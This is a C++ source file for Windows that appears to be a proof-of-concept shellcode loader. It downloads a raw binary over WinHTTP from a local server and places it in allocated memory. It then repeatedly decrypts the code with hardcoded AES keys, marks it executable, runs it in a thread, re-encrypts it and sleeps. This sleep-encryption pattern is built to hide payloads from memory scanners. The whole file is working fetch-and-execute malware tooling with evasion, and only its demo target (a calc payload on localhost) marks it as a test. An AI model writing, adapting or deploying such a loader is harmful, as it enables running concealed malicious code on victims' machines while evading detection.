#include <windows.h>
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <iomanip>
#include "aes.h" // Include Tiny AES header
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

using namespace std;

// AES key and initialization vector
const uint8_t aesKey[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };
const uint8_t aesIV[16] = { 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
                           0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F };

// Function to download a file from a server
bool downloadFile(const wstring& server, const wstring& path, vector<uint8_t>& buffer) {
    HINTERNET hSession = WinHttpOpen(L"Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, server.c_str(), 8000, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesRead = 0;
    do {
        uint8_t bufferPart[4096];
        if (WinHttpReadData(hRequest, bufferPart, sizeof(bufferPart), &bytesRead) && bytesRead > 0) {
            buffer.insert(buffer.end(), bufferPart, bufferPart + bytesRead);
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return true;
}

// Encrypt memory using Tiny AES
void aesEncrypt(void* buffer, size_t size) {
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIV);
    AES_CBC_encrypt_buffer(&ctx, static_cast<uint8_t*>(buffer), size);
}

// Decrypt memory using Tiny AES
void aesDecrypt(void* buffer, size_t size) {
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIV);
    AES_CBC_decrypt_buffer(&ctx, static_cast<uint8_t*>(buffer), size);
}

// Thread function to execute the payload
DWORD WINAPI executePayload(LPVOID lpParam) {
    auto funcPtr = reinterpret_cast<void(*)()>(lpParam);
    try {
        funcPtr(); // Execute the function
        cout << "[DEBUG] Payload executed successfully." << endl;
    }
    catch (...) {
        cerr << "[!] Exception occurred during payload execution!" << endl;
    }
    ExitThread(0);
}

int main() {
    const wstring server = L"localhost";
    const wstring path = L"/calc.bin";

    vector<uint8_t> binBuffer;
    if (!downloadFile(server, path, binBuffer)) {
        cerr << "Failed to download the file!" << endl;
        return 1;
    }

    cout << "[+] Downloaded .bin file, size: " << binBuffer.size() << " bytes." << endl;

    // Pad binary buffer size
    size_t paddedSize = (binBuffer.size() + 15) & ~15;
    binBuffer.resize(paddedSize, 0);
    cout << "[DEBUG] Padded binary buffer size: " << paddedSize << " bytes." << endl;

    // Step 2: Allocate a new memory region for the function
    void* funcMemory = VirtualAlloc(NULL, paddedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!funcMemory) {
        cerr << "[ERROR] Failed to allocate memory for function!" << endl;
        return 1;
    }

    cout << "[+] Allocated memory for function at: 0x" << hex << (uintptr_t)funcMemory << endl;

    // Step 3: Copy the binary buffer into the allocated memory
    memcpy(funcMemory, binBuffer.data(), binBuffer.size());
    cout << "[+] Binary data copied to function memory." << endl;

    // Step 4: Encrypt the function
    aesEncrypt(funcMemory, paddedSize);
    cout << "[+] Function encrypted." << endl;

    // Step 5: Main loop: Decrypt, execute, and re-encrypt
    DWORD oldProtect;
    while (true) {
        // Change to PAGE_READWRITE for decryption
        if (!VirtualProtect(funcMemory, paddedSize, PAGE_READWRITE, &oldProtect)) {
            cerr << "[ERROR] Failed to set memory to PAGE_READWRITE!" << endl;
            break;
        }

        aesDecrypt(funcMemory, paddedSize);
        cout << "[+] Function decrypted." << endl;

        // Change to PAGE_EXECUTE_READ for execution
        if (!VirtualProtect(funcMemory, paddedSize, PAGE_EXECUTE_READ, &oldProtect)) {
            cerr << "[ERROR] Failed to set memory to PAGE_EXECUTE_READ!" << endl;
            break;
        }

        // Execute the function in a separate thread
        HANDLE hThread = CreateThread(NULL, 0, executePayload, funcMemory, 0, NULL);
        if (!hThread) {
            cerr << "[ERROR] Failed to create thread for execution!" << endl;
            break;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);

        // Change back to PAGE_READWRITE for encryption
        if (!VirtualProtect(funcMemory, paddedSize, PAGE_READWRITE, &oldProtect)) {
            cerr << "[ERROR] Failed to set memory to PAGE_READWRITE!" << endl;
            break;
        }

        aesEncrypt(funcMemory, paddedSize);
        cout << "[+] Function re-encrypted." << endl;

        this_thread::sleep_for(chrono::seconds(15));
    }

    // Clean up
    VirtualFree(funcMemory, 0, MEM_RELEASE);
    return 0;
}
